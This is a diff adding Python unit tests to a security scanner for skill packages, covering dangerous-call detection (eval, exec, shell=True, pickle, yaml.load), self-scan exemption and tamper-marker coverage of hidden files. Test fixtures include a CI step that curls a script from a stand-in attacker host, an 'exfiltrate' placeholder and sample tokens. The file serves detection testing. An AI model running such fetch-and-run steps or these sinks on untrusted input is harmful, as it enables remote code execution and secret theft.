@@ -205,5 +205,248 @@ class TestBlockingInteractiveInput(unittest.TestCase):
         self.assertEqual(matches[0]["line"], 2)
 
 
+class TestDangerousSinkCoverage(unittest.TestCase):
+    """The dangerous-sink list, and the whole-file matching it needs.
+
+    Two gaps this covers. First, the checks used to run one physical line at
+    a time, so any call a formatter had wrapped across lines matched nothing
+    — `shell=True` on its own line was invisible. Second, the list only knew
+    four shapes; the ordinary Python ways to execute a string or deserialize
+    into live objects weren't checked at all.
+    """
+
+    def _details(self, filename: str, content: str) -> str:
+        findings = findings_for(filename, content)
+        return " | ".join(f["detail"] for f in findings if f["check"] == "dangerous-code-pattern")
+
+    def test_multi_line_shell_true_is_caught(self):
+        content = (
+            "import subprocess\n"
+            "subprocess.run(\n"
+            "    cmd,\n"
+            "    shell=True,\n"
+            ")\n"
+        )
+        self.assertIn("shell=True", self._details("run.py", content))
+
+    def test_single_line_shell_true_still_caught(self):
+        self.assertIn("shell=True", self._details("run.py", "subprocess.run(cmd, shell=True)\n"))
+
+    def test_shell_true_after_a_nested_call_is_caught(self):
+        content = "subprocess.run(shlex.split(cmd), shell=True)\n"
+        self.assertIn("shell=True", self._details("run.py", content))
+
+    def test_multi_line_finding_reports_the_line_the_call_starts_on(self):
+        content = "x = 1\nimport subprocess\nsubprocess.run(\n    cmd,\n    shell=True,\n)\n"
+        findings = [f for f in findings_for("run.py", content) if f["check"] == "dangerous-code-pattern"]
+        self.assertEqual([f["line"] for f in findings], [3])
+
+    def test_eval_is_caught(self):
+        self.assertIn("eval(", self._details("x.py", "result = eval(user_supplied)\n"))
+
+    def test_exec_is_caught(self):
+        self.assertIn("exec(", self._details("x.py", "exec(payload)\n"))
+
+    def test_compile_is_caught(self):
+        self.assertIn("compile(", self._details("x.py", "code = compile(src, '<s>', 'exec')\n"))
+
+    def test_os_popen_is_caught(self):
+        self.assertIn("os.popen(", self._details("x.py", "out = os.popen(cmd).read()\n"))
+
+    def test_subprocess_getoutput_is_caught(self):
+        self.assertIn("getoutput(", self._details("x.py", "out = subprocess.getoutput(cmd)\n"))
+
+    def test_subprocess_getstatusoutput_is_caught(self):
+        self.assertIn("getoutput(", self._details("x.py", "rc, out = subprocess.getstatusoutput(cmd)\n"))
+
+    def test_yaml_load_without_safe_loader_is_caught(self):
+        self.assertIn("SafeLoader", self._details("x.py", "cfg = yaml.load(stream)\n"))
+
+    def test_yaml_load_with_safe_loader_is_not_flagged(self):
+        self.assertEqual("", self._details("x.py", "cfg = yaml.load(stream, Loader=yaml.SafeLoader)\n"))
+
+    def test_yaml_safe_load_is_not_flagged(self):
+        self.assertEqual("", self._details("x.py", "cfg = yaml.safe_load(stream)\n"))
+
+    def test_js_yaml_load_is_not_flagged(self):
+        # js-yaml's `load` has been the safe one since its 4.0 — the same
+        # spelling means the opposite thing outside Python.
+        self.assertEqual("", self._details("parser.js", "const fm = yaml.load(text);\n"))
+
+    def test_marshal_loads_is_caught(self):
+        self.assertIn("marshal", self._details("x.py", "obj = marshal.loads(blob)\n"))
+
+    def test_import_marshal_is_caught(self):
+        self.assertIn("marshal", self._details("x.py", "import marshal\n"))
+
+    def test_dunder_import_is_caught(self):
+        self.assertIn("__import__(", self._details("x.py", "mod = __import__(name)\n"))
+
+    def test_pickle_loads_is_caught(self):
+        self.assertIn("pickle", self._details("x.py", "obj = pickle.loads(blob)\n"))
+
+    def test_attribute_access_is_not_mistaken_for_a_builtin(self):
+        # The single biggest false-positive risk in adding bare-name checks:
+        # `re.compile(` is on nearly every line of this project's own
+        # scanner, and `.eval(`/`.exec(` are ordinary method names.
+        content = (
+            "import re\n"
+            "PATTERN = re.compile(r'x')\n"
+            "session.exec(stmt)\n"
+            "model.eval()\n"
+            "df.eval('a + b')\n"
+            "cursor.execute(sql)\n"
+        )
+        self.assertEqual("", self._details("x.py", content))
+
+    def test_identifiers_merely_containing_a_sink_name_are_not_flagged(self):
+        content = "eval_loop = 1\nevaluate(x)\nprecompile_all()\nmy_eval(1)\n"
+        self.assertEqual("", self._details("x.py", content))
+
+    def test_markdown_code_span_exemption_still_holds_for_the_new_sinks(self):
+        content = "Avoid `eval(`, `exec(` and `marshal.loads(` in bundled scripts.\n"
+        self.assertEqual("", self._details("security-checklist.md", content))
+
+    def test_markdown_fenced_block_exemption_still_holds_for_the_new_sinks(self):
+        content = "Bad:\n\n```python\nresult = eval(user_supplied)\n```\n"
+        self.assertEqual("", self._details("guide.md", content))
+
+    def test_the_same_sink_outside_backticks_in_markdown_is_still_flagged(self):
+        content = "Then call eval(payload) to run it.\n"
+        self.assertIn("eval(", self._details("guide.md", content))
+
+
+class TestSelfScanExemptionAfterSinkExpansion(unittest.TestCase):
+    """The scanner's own pattern definitions contain, as literal source, the
+    shapes they detect. That exemption has to keep working now that the
+    definitions have grown — and the expanded sink list must not start
+    flagging this repo's own scripts.
+
+    Distinct from TestSelfScanExemption above, which guards the original
+    mechanism; this covers the enlarged pattern set specifically.
+    """
+
+    def test_scanning_the_scripts_directory_reports_no_dangerous_patterns(self):
+        findings = security_scan.run_pattern_checks(SCRIPTS_DIR)
+        offenders = [
+            f for f in findings
+            if f["check"] == "dangerous-code-pattern" and f["file"] == "security_scan.py"
+        ]
+        self.assertEqual(offenders, [], f"self-scan exemption regressed: {offenders}")
+
+    def test_the_exempt_range_is_still_located(self):
+        text = (SCRIPTS_DIR / "security_scan.py").read_text()
+        self.assertTrue(security_scan.self_scan_exempt_line_numbers(text))
+
+    def test_the_repos_own_scripts_produce_no_high_severity_findings(self):
+        # The real no-false-positive check: every bundled script in this
+        # repo, scanned with the live pattern set.
+        findings = security_scan.run_pattern_checks(SCRIPTS_DIR)
+        high = [f for f in findings if f["severity"] == "HIGH"]
+        self.assertEqual(high, [], f"new false positives on this repo's own scripts: {high}")
+
+
+class TestHiddenFilesAreScanned(unittest.TestCase):
+    """Hidden files used to be invisible to every consumer of
+    iter_scannable_files. That made the pattern checks unable to see `.env`,
+    `.npmrc` or `.github/workflows/*`, and — worse — made the tamper marker
+    structurally blind to a whole class of change: a hidden file could be
+    added or edited after a clean scan and the marker still verified.
+    """
+
+    def _tree(self, tmp: Path) -> Path:
+        skill = tmp / "a-skill"
+        (skill / ".github" / "workflows").mkdir(parents=True)
+        (skill / "SKILL.md").write_text("---\nname: a-skill\ndescription: d\n---\n\nBody\n")
+        return skill
+
+    def test_dotfile_contents_are_pattern_checked(self):
+        with tempfile.TemporaryDirectory() as tmp:
+            skill = self._tree(Path(tmp))
+            (skill / ".env").write_text("HOME_DIR=/home/someone/secrets\n")
+            findings = security_scan.run_pattern_checks(skill)
+        self.assertIn(".env", [f["file"] for f in findings])
+
+    def test_hidden_directory_contents_are_pattern_checked(self):
+        with tempfile.TemporaryDirectory() as tmp:
+            skill = self._tree(Path(tmp))
+            wf = skill / ".github" / "workflows" / "ci.yml"
+            wf.write_text("jobs:\n  x:\n    steps:\n      - run: curl http://evil.example/p.sh\n")
+            findings = security_scan.run_pattern_checks(skill)
+        self.assertIn(".github/workflows/ci.yml", [f["file"].replace("\\", "/") for f in findings])
+
+    def test_git_directory_stays_excluded(self):
+        with tempfile.TemporaryDirectory() as tmp:
+            skill = self._tree(Path(tmp))
+            (skill / ".git").mkdir()
+            (skill / ".git" / "config").write_text("url = /home/someone/repo\n")
+            files = [rel.as_posix() for _, rel in
+                     security_scan.iter_scannable_files(skill, [], include_hidden=True)]
+        self.assertNotIn(".git/config", files)
+
+    def test_skillignore_still_applies_to_hidden_files(self):
+        with tempfile.TemporaryDirectory() as tmp:
+            skill = self._tree(Path(tmp))
+            (skill / ".skillignore").write_text(".env\n")
+            (skill / ".env").write_text("SECRET=x\n")
+            files = [rel.as_posix() for _, rel in
+                     security_scan.iter_scannable_files(skill, security_scan.load_skillignore(skill),
+                                                        include_hidden=True)]
+        self.assertNotIn(".env", files)
+
+    def test_packaging_still_excludes_hidden_files(self):
+        with tempfile.TemporaryDirectory() as tmp:
+            skill = self._tree(Path(tmp))
+            (skill / ".env").write_text("SECRET=x\n")
+            files = [rel.as_posix() for _, rel in security_scan.iter_scannable_files(skill, [])]
+        self.assertEqual(files, ["SKILL.md"])
+
+    def test_marker_goes_stale_when_a_hidden_file_is_modified(self):
+        with tempfile.TemporaryDirectory() as tmp:
+            skill = self._tree(Path(tmp))
+            (skill / ".env").write_text("SECRET=original\n")
+
+            security_scan.write_marker(skill, security_scan.compute_content_hash(skill))
+            valid, _ = security_scan.verify_marker(skill)
+            self.assertTrue(valid, "a freshly written marker must verify")
+
+            (skill / ".env").write_text("SECRET=tampered\n")
+            valid, reason = security_scan.verify_marker(skill)
+        self.assertFalse(valid, "editing a hidden file must invalidate the marker")
+        self.assertIn("changed", reason)
+
+    def test_marker_goes_stale_when_a_hidden_file_is_added(self):
+        with tempfile.TemporaryDirectory() as tmp:
+            skill = self._tree(Path(tmp))
+            security_scan.write_marker(skill, security_scan.compute_content_hash(skill))
+            self.assertTrue(security_scan.verify_marker(skill)[0])
+
+            (skill / ".npmrc").write_text("//registry.example/:_authToken=abc\n")
+            valid, _ = security_scan.verify_marker(skill)
+        self.assertFalse(valid, "adding a hidden file must invalidate the marker")
+
+    def test_marker_goes_stale_when_a_file_in_a_hidden_directory_changes(self):
+        with tempfile.TemporaryDirectory() as tmp:
+            skill = self._tree(Path(tmp))
+            wf = skill / ".github" / "workflows" / "ci.yml"
+            wf.write_text("jobs: {}\n")
+            security_scan.write_marker(skill, security_scan.compute_content_hash(skill))
+            self.assertTrue(security_scan.verify_marker(skill)[0])
+
+            wf.write_text("jobs:\n  x:\n    steps:\n      - run: exfiltrate\n")
+            valid, _ = security_scan.verify_marker(skill)
+        self.assertFalse(valid)
+
+    def test_the_marker_itself_is_never_part_of_its_own_hash(self):
+        # Otherwise writing the marker would immediately invalidate it.
+        with tempfile.TemporaryDirectory() as tmp:
+            skill = self._tree(Path(tmp))
+            before = security_scan.compute_content_hash(skill)
+            security_scan.write_marker(skill, before)
+            after = security_scan.compute_content_hash(skill)
+        self.assertEqual(before, after)
+        self.assertTrue(security_scan.is_marker_file(Path(security_scan.MARKER_FILENAME)))
+
+
 if __name__ == "__main__":
     unittest.main()
